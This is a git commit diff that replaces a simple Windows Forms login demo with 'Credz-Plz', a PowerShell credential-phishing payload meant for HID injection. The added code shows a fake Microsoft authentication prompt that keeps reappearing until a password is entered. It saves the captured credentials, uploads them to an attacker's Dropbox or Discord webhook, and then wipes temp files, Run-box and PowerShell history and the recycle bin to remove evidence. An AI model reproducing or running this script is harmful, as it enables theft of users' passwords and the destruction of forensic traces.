e919bc75ad17d7c08864891dd4288ef506f81b08
pedrito12a <153040660+pedrito12a@users.noreply.github.com>
2023-12-06 02:22:16 +0100

    Update Credz-Plz.ps1

--- Credz-Plz.ps1
+++ Credz-Plz.ps1
@@ -1,126 +1,238 @@
-# Importar el módulo Windows Forms
-Add-Type -AssemblyName System.Windows.Forms
+############################################################################################################################################################                      
+#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
+# Title        : Credz-Plz         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
+# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
+# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
+# Category     : Credentials       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
+# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
+# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
+#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
+#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
+#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
+#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
+#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
+#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
+#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
+#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
+#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
+############################################################################################################################################################
 
-# Crear el formulario principal
-$form = New-Object System.Windows.Forms.Form
-$form.Text = "Windows Security"
-$form.Size = New-Object System.Drawing.Size(300,200)
-$form.StartPosition = "CenterScreen"
-$form.BackColor = "Gray"
+<#
+.SYNOPSIS
+	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message
 
-# Crear el campo de usuario
-$userLabel = New-Object System.Windows.Forms.Label
-$userLabel.Text = "User name"
-$userLabel.Location = New-Object System.Drawing.Point(10,10)
-$userLabel.AutoSize = $true
-$userLabel.ForeColor = "White"
-$form.Controls.Add($userLabel)
+.DESCRIPTION 
+	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
+	This will be followed by a fake authentication ui prompt. 
+	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
+	Once the target enters their credentials their information will be uploaded to either your Dropbox or Discord webhook for collection
 
-$userBox = New-Object System.Windows.Forms.TextBox
-$userBox.Location = New-Object System.Drawing.Point(80,10)
-$userBox.Size = New-Object System.Drawing.Size(200,20)
-$form.Controls.Add($userBox)
+.Link
+	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
 
-# Crear el campo de contraseña
-$passwordLabel = New-Object System.Windows.Forms.Label
-$passwordLabel.Text = "Password"
-$passwordLabel.Location = New-Object System.Drawing.Point(10,40)
-$passwordLabel.AutoSize = $true
-$passwordLabel.ForeColor = "White"
-$form.Controls.Add($passwordLabel)
+#>
 
-$passwordBox = New-Object System.Windows.Forms.TextBox
-$passwordBox.Location = New-Object System.Drawing.Point(80,40)
-$passwordBox.Size = New-Object System.Drawing.Size(200,20)
-$passwordBox.UseSystemPasswordChar = $true
-$form.Controls.Add($passwordBox)
+#------------------------------------------------------------------------------------------------------------------------------------
+# This is for if you want to host your own version of the script
 
-# Crear el enlace de más opciones
-$moreLink = New-Object System.Windows.Forms.LinkLabel
-$moreLink.Text = "More choices"
-$moreLink.Location = New-Object System.Drawing.Point(10,70)
-$moreLink.AutoSize = $true
-$moreLink.LinkColor = "White"
-$form.Controls.Add($moreLink)
+# $db = "YOUR-DROPBOX-ACCESS-TOKEN"
 
-# Crear el botón de OK
-$okButton = New-Object System.Windows.Forms.Button
-$okButton.Text = "OK"
-$okButton.Location = New-Object System.Drawing.Point(100,120)
-$okButton.Size = New-Object System.Drawing.Size(80,30)
-$form.Controls.Add($okButton)
+# $dc = "YOUR-DISCORD-WEBHOOK"
 
-# Crear el botón de Cancel
-$cancelButton = New-Object System.Windows.Forms.Button
-$cancelButton.Text = "Cancel"
-$cancelButton.Location = New-Object System.Drawing.Point(200,120)
-$cancelButton.Size = New-Object System.Drawing.Size(80,30)
-$form.Controls.Add($cancelButton)
+#------------------------------------------------------------------------------------------------------------------------------------
 
-# Definir una función para validar el usuario y la contraseña
-function Validate($user, $password) {
-    # Aquí puedes poner la lógica que quieras para comprobar si el usuario y la contraseña son válidos
-    # Por ejemplo, puedes usar una lista de usuarios y contraseñas predefinidos, o hacer una llamada a una API
-    # En este caso, vamos a usar un usuario y una contraseña fijos para simplificar
-    if ($user -eq "admin" -and $password -eq "1234") {
-        return $true
-    } else {
-        return $false
+$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to generate the ui.prompt you will use to harvest their credentials
+#>
+
+function Get-Creds {
+
+    $form = $null
+
+    while ($form -eq $null)
+    {
+        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred.getnetworkcredential().password
+
+        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
+        {
+            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
+            {
+                Add-Type -AssemblyName PresentationCore,PresentationFramework
+            }
+
+            $msgBody = "Credentials cannot be empty!"
+            $msgTitle = "Error"
+            $msgButton = 'Ok'
+            $msgImage = 'Stop'
+            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+            Write-Host "The user clicked: $Result"
+          
+        }
+        
+        else{
+            $creds = $cred.GetNetworkCredential() | fl
+            return $creds
+        }
     }
 }
 
-# Añadir un evento al botón de OK para que se ejecute cuando se haga clic
-$okButton.Add_Click({
-    # Obtener los valores de los campos de usuario y contraseña
-    $userValue = $userBox.Text
-    $passwordValue = $passwordBox.Text
-    # Llamar a la función de validar con los valores obtenidos
-    $valid = Validate $userValue $passwordValue
-    # Si el resultado es verdadero, mostrar un mensaje de éxito
-    # Si el resultado es falso, mostrar un mensaje de error
-    if ($valid) {
-        [System.Windows.Forms.MessageBox]::Show("Has iniciado sesión correctamente", "Éxito", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
-    } else {
-        [System.Windows.Forms.MessageBox]::Show("Usuario o contraseña incorrectos", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to pause the script until a mouse movement is detected
+#>
+
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
     }
-})
+}
 
-# Añadir un evento al botón de Cancel para que se cierre el formulario
-$cancelButton.Add_Click({
-    $form.Close()
-})
+#----------------------------------------------------------------------------------------------------
 
-# Añadir un evento al enlace de más opciones para que se abra una nueva ventana con otras opciones
-$moreLink.Add_Click({
-    # Crear una nueva ventana con un listado de opciones
-    $optionsForm = New-Object System.Windows.Forms.Form
-    $optionsForm.Text = "More choices"
-    $optionsForm.Size = New-Object System.Drawing.Size(300,200)
-    $optionsForm.StartPosition = "CenterScreen"
-    $optionsForm.BackColor = "Gray"
+# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
 
-    # Crear un control de lista con las opciones disponibles
-    $optionsList = New-Object System.Windows.Forms.ListBox
-    $optionsList.Location = New-Object System.Drawing.Point(10,10)
-    $optionsList.Size = New-Object System.Drawing.Size(280,150)
-    $optionsList.Items.Add("Use a different account")
-    $optionsList.Items.Add("Use a smart card")
-    $optionsList.Items.Add("Use Windows Hello")
-    $optionsForm.Controls.Add($optionsList)
+function Caps-Off {
+Add-Type -AssemblyName System.Windows.Forms
+$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
 
-    # Crear un botón de OK para cerrar la ventana de opciones
-    $okButton = New-Object System.Windows.Forms.Button
-    $okButton.Text = "OK"
-    $okButton.Location = New-Object System.Drawing.Point(100,160)
-    $okButton.Size = New-Object System.Drawing.Size(80,30)
-    $okButton.Add_Click({
-        $optionsForm.Close()
-    })
-    $optionsForm.Controls.Add($okButton)
+#If true, toggle CapsLock key, to ensure that the script doesn't fail
+if ($caps -eq $true){
 
-    # Mostrar la ventana de opciones
-    $optionsForm.ShowDialog()
-})
+$key = New-Object -ComObject WScript.Shell
+$key.SendKeys('{CapsLock}')
+}
+}
+#----------------------------------------------------------------------------------------------------
 
-# Mostrar el formulario
-$form.ShowDialog()
+<#
+
+.NOTES 
+	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
+#>
+
+Pause-Script
+
+Caps-Off
+
+Add-Type -AssemblyName PresentationCore,PresentationFramework
+$msgBody = "Please authenticate your Microsoft Account."
+$msgTitle = "Authentication Required"
+$msgButton = 'Ok'
+$msgImage = 'Warning'
+$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+Write-Host "The user clicked: $Result"
+
+$creds = Get-Creds
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to save the gathered credentials to a file in the temp directory
+#>
+
+echo $creds >> $env:TMP\$FileName
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to upload your files to dropbox
+#>
+
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $db
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+exit
